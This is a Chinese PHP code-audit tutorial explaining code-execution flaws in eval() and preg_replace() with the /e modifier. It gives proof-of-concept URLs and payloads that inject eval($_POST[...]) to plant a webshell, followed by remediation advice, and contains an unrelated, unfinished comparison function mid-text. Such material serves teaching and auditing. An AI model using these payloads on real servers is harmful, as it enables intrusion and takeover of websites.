代码审计

eval()函数漏洞利用(1)

源码

<?php
// 参数接收点
$data = $_GET['data'];
// 参数作为代码被执行
eval("\$ret = $data");
echo $ret;
  • 未对接收的GET参数进行过滤操作，因此此处存在代码执行漏洞。

利用姿势：

  1. 使用如下所示POC来测试该点的代码执行漏洞，操作结果如下图所示。

    http://localhost/index.php?data=phpinfo();

  2. 由上述操作可知该点存在命令执行漏洞，可使用如下payload通过蚁剑拿到webshell。

    http://localhost/index.php?data=eval($_POST['root']);
http://localhost/index.php?data=${eval($_POST['root'])};
http://localhost/index.php?data=1;eval($_POST['root']);

  3. 代码执行过程分析。

    http://localhost/index.php?data=eval($_POST['root']);
http://localhost/index.php?data=${eval($_POST['root'])};
// 这两个payload本质是一致的
// echo $ret = eval($_POST['root']);

http://localhost/index.php?data=1;eval($_POST['root']);
// 将一条代码分割成两条代码
// echo $ret = 1; eval($_POST['root']);

preg_replace()函数

源码：

$data = $_GET['data'];
preg_replace('/<data>(.*)<\/data>/e', '$ret="\\1";', $data);
echo $ret;// $ret = "   "

触发条件

  • PHP版本≤5.6

  • 模式必须匹配到

  • 模式必须带有e

  • replacement参数可控或间接可控

  • 执行语句需要结束符（php语法强制需要结束符）

利用姿势：

  1. 使用如下payload可以拿到Webshell操作结果如下图所示。

    http://localhost/index.php?data=<data>${eval($_POST[1])}</data>

  2. 代码执行过程分析。

    http://localhost/index.php?data=<data>${eval($_POST[1])}</data>

preg_replace('/<data>(.*)<\/data>/e', '$ret="\\1";', $data);
echo $ret;
-----------------------------------------------------------------
// 提高运行优先级
preg_replace('/<data>(.*)<\/data>/e', '$ret="\\1";', <data>${eval($_POST[1])}</data>);
// 输入参数被匹配到并执行${eval($_POST[1])}

function cmp_diy($num1, $num2)
{
    // $num1 $num2比较，
    // 如果$mun1排前面返回-1

    return $num1 > $num2 ? (-1) : ($num1 == $num2 ? 0 : 1);

漏洞修复

  • 对于eval( )等函数一定要保证用户不能轻易接触eval或者其他代码执行的的参数或者用正则严格(preg_replace /e)判断输入的数据格式。
  • 对于字符串一定要使用单引号包裹可控代码，并且 插入前进行addslashes().
  • 对于preg_replace放弃使用e修饰符。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。
